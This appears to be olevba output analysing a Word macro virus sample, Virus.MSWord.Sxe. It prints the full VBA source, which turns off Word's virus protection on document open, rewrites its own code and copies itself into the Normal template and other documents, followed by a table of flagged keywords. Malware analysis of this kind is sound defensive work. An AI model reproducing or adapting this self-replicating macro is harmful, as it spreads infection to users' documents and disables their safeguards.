olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sxe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sxe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sXe.bas 
in file: ./Virus.MSWord.Sxe - OLE stream: 'Macros/VBA/sXe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public abc As Object
Sub Document_Open()
Set a = MacroContainer.VBProject: Options.VirusProtection = False: Set ab = a.VBComponents("sXe"): Set abc = ab.codemodule
InsertCode
Hidden
abc.deletelines 27, 16

Rem Set ado = ActiveDocument.VBProject.VBComponents
Rem Set nt = NormalTemplate.VBProject.VBComponents
Rem z$ = "c:\windows\system\no32close.sys"
Rem n$ = "sXe"
Rem Application.VBE.ActiveVBProject.VBComponents(n$).Export z$
Rem ai = 0
Rem ni = 0
Rem For j = 1 To nt.Count
Rem If nt(j).Name = n$ Then ni = 1
Rem Next
Rem For h = 1 To ado.Count
Rem If ado(h).Name = n$ Then ai = 1
Rem Next
Rem If ni = 0 Then nt.import z$: NormalTemplate.Save
Rem If ai = 0 Then ado.import z$: ActiveDocument.Save

End Sub

Sub Hidden()
End Sub

Function InsertCode()
For i = 8 To 22
m = Right(abc.lines(i, 1), (Len(abc.lines(i, 1)) - 4)) & vbCr
co = co & m
Next
abc.insertlines 27, co
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

